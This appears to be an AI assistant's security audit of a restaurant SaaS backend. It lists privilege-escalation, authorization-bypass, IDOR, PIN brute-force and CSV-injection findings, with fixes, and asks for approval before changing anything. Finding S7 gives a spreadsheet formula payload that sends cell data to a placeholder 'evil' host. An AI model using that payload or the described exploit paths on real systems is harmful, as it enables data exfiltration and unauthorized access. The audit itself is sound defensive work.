# FoodFlow — Security Audit (attacker's-eye review)
**Date:** 23 Aug 2026 · **Method:** 4 parallel penetration passes (auth/session, multi-tenant authz/IDOR, injection, uploads/webhooks/secrets/infra/XSS). Top findings re-verified by hand against source. **Nothing fixed yet — this is the findings list for your go-ahead.**

## Verdict
The core is in good shape: parameterized SQL throughout (no SQL injection found), HMAC-verified webhooks with replay protection, hardened uploads, bcrypt hashing, prod-enforced secrets/CORS. But there are **2 High-severity access-control holes an attacker can drive a truck through**, plus a cluster of Mediums. Fix the Highs before beta.

---

## 🔴 HIGH — fix before launch

### S1 — Refresh token isn't tied to a user → privilege escalation in any multi-staff business
**`db/migrations/001_init_schema.sql:56-65`** (no `user_id` column) + **`src/services/authService.js:215-237`** (consume query).
The `refresh_tokens` table stores only `business_id`, not who logged in. On `POST /v1/auth/refresh` the lookup is:
```sql
SELECT rt.*, bu.user_id, bu.role
  FROM refresh_tokens rt
  JOIN business_users bu ON bu.business_id = rt.business_id AND bu.is_active = TRUE
 WHERE rt.token_hash = $1 ... LIMIT 1   -- no user_id filter, no ORDER BY
```
The JOIN matches **every active member** of the business and `LIMIT 1` picks one arbitrarily. The new access token's identity/role come from whoever that row is — not the person who logged in.
**Exploit:** a `staff_cashier` logs in, calls `/auth/refresh`, and can be minted a token with `role = business_owner` (the owner row, created first, is the natural pick). Repeat until elevated. Grants banking fields, staff management, reports.
**Verified:** confirmed no `user_id` column exists in any migration; query filters on `business_id` only.
**Fix direction:** add `user_id` to `refresh_tokens`, store it on issue, filter the refresh JOIN by `rt.user_id`.

### S2 — Any admin token (any admin role) can read/write ANY tenant, bypassing admin RBAC and the "impersonation is read-only" rule
**`src/middleware/auth.js:70`** and **`:124`** — both `requireBusinessOwnership` and `requireRole` start with `if (req.user?.isSuperAdmin) return next();`. The impersonation read-only guard sits *below* that early return, so a normal admin **login** token (`isSuperAdmin:true`, `imp` absent) skips ownership, skips role checks, and is **not** treated as read-only.
**Exploit:** a `support` or `sales` admin — whose admin RBAC matrix grants almost no writes — takes their own valid bearer token and calls `DELETE /v1/businesses/<any>/menu/<id>`, `POST /v1/businesses/<any>/orders/<id>/refund`, `PUT /v1/businesses/<any>/staff/<uid>/role`, etc. Full mutation of any restaurant, outside the audit-logged `/admin` surface and outside the finance/support/sales permission split.
**Verified:** confirmed both bypasses in code; read-only check is unreachable for non-impersonation admin tokens.
**Fix direction:** super-admin bypass on the business API should still enforce the admin RBAC matrix and the write-block for non-owner admin roles (or require explicit impersonation for any tenant write).

---

## 🟠 MEDIUM

### S3 — Super-admin identity never re-checked against the DB
**`src/middleware/auth.js:27-28,46-55`; `src/services/adminService.js:56-59`.** Business roles get a live 30-second DB re-check (`business_users.is_active`); super-admin tokens do **not** check `admin_users.is_active`. A deactivated/fired admin's un-expired token keeps full platform access until it expires. Combine with S1/S2 for maximum blast radius.

### S4 — Staff PIN brute-force is realistically open
**`src/routes/auth.routes.js:13-15,26-27`; `src/services/staffService.js:556-637`.** Three compounding gaps: (a) `loginLimiter` is a **no-op outside production** and even in prod is only 30/min/IP with **no per-account lockout**; (b) the PIN lockout counter is an in-memory `Map` — resets on restart, not shared across PM2 workers (effective cap × N workers); (c) `POST /auth/staff-picker` is **unauthenticated** and returns every staff `userId`+`role`+name for any `businessId` you name. PINs are 4 digits (10k space). An attacker who knows a business UUID gets the exact userIds for free, then brute-forces the 4-digit PIN.
**Verified:** staff-picker mounted with `loginLimiter` only, no `requireAuth`.

### S5 — No refresh-token reuse detection / no real logout
**`src/services/authService.js:215-243`; `src/controllers/authController.js:426-431`.** Rotation exists but a replayed already-rotated token just 401s — no token-family revocation, so a stolen refresh chain keeps working for its 30-day TTL and the victim never notices. Logout revokes only the one presented refresh hash; the issued access JWT stays valid to expiry (no deny-list). No way to force-kill a compromised session.

### S6 — Retail Goods-Receipt cross-tenant write (IDOR)
**`src/services/retailService.js:130-160`** (route `POST /retail/purchase-orders/:poId/receive`). `receivePO` never checks that `poId` / `body.lines[].poLineId` belong to the caller's business. `UPDATE purchase_order_lines SET qty_received = qty_received + $1 WHERE id = $2` has **no business scope**.
**Exploit:** owner of A posts to `/businesses/A/retail/purchase-orders/<B's poId>/receive` with `poLineId=<B's line>` → corrupts business B's procurement records (creates GRN rows against B's PO, inflates received qty). Needs to guess B's line UUIDs; stock bump itself is scoped so no stock leak.
**Verified:** confirmed unscoped UPDATE.

### S7 — CSV formula injection in report exports
**`src/services/reportExporters.js:25-30`** (`_csvEscape`). Quotes are escaped but cells starting with `= + - @` aren't neutralized. Attacker-controlled fields (`customerName`, `customerPhone`, expense `description`/`category`, invoice `recipientName`/`recipientGstin`) flow into the CSV.
**Exploit:** file an expense with description `=IMPORTXML(CONCAT("http://evil/",A1),"//x")`; when the owner opens the exported register in Excel/Sheets the formula runs (data exfil / command exec). XLSX path is safe (stored as strings); CSV is the risk.

---

## 🟡 LOW / hardening

- **S8** — JWT verify doesn't pin `algorithms:['HS256']` (`src/utils/jwt.js:18`). Library default blocks `alg:none` today, but pin it explicitly. Also one shared `JWT_SECRET` for business + admin + impersonation + 2FA KEK — no key separation.
- **S9** — CSRF issuance is dead code (`src/middleware/csrf.js:26-37` never called); cookie-mode writes rely solely on `sameSite=strict`. Fine while everyone uses Bearer, but the CSRF design is non-functional.
- **S10** — Landing pricing grid: `plan.billingPeriod` still interpolated **unescaped** into innerHTML (`foodflow_landing/index.html:704`); the rest was patched. Admin-controlled value, low likelihood.
- **S11** — Dashboard/admin store the access token in `localStorage` (XSS-exfiltratable). Deliberate — refresh token is httpOnly-cookie, so blast radius ≤1h. Noting the tradeoff.
- **S12** — `list`/report endpoints don't cap `limit`/`offset` (bound params, so no injection) — a huge `limit` is a mild DoS. Add a Joi cap.
- **S13** — pg unique-violation returns `err.detail` to clients in all envs (`src/middleware/errorHandler.js:21-26`) — minor info leak (e.g. which email is registered).
- **S14** — `razorpayService.verifyCheckoutSignature` (`:428`) lacks a length/nil guard → malformed client signature throws 500 instead of clean 401. Robustness only.
- **S15** — LIKE search doesn't escape `%`/`_` (multiple services) — functional wildcard quirk, not injection.

---

## Verified SAFE (so you know it was checked)
No SQL injection (all queries parameterized; the interpolated spots are `parseInt`/whitelist/fixed-enum only). No shell exec, no `eval`, no dynamic regex. Uploads: authed, business-scoped, UUID filenames, MIME allow-list, path-traversal-blocked, SVG excluded, 5MB cap. Webhooks (Razorpay/aggregator/WhatsApp): HMAC over raw body, timing-safe compare, replay/idempotency protection, fail-closed in prod. Secrets: none committed (`.env` gitignored), prod boot crashes without `JWT_SECRET`, no default admin password, dev-login double-gated off in prod. CORS `*` and stack traces neutralized in prod; helmet on; x-powered-by off; refresh cookie httpOnly+sameSite=strict+secure. Google Sign-In audience validated. Standard REST resources (orders, menu, customers, invoices, refunds, gift cards, memberships, multi-outlet) all tenant-scoped `WHERE business_id AND id`. Mass-assignment of `business_id`/`owner_id`/`plan_tier` blocked by column whitelists.

---

## Recommended fix order
1. **S1** refresh-token user binding (privilege escalation) — needs a migration.
2. **S2** admin-token authz bypass on the business API.
3. **S3** super-admin live DB re-check · **S4** PIN brute-force (lockout + auth the staff-picker + shared counter).
4. **S6** retail GRN scoping · **S7** CSV injection · **S5** reuse detection / logout revocation.
5. Lows as cleanup.

Tell me which to fix (e.g. "fix S1–S4" or "all Highs+Mediums") and I'll implement with a full verification pass. S1 requires a new migration (056) — flagging since your standing rule is no DB drops; this is additive (`ADD COLUMN user_id`), no data loss.
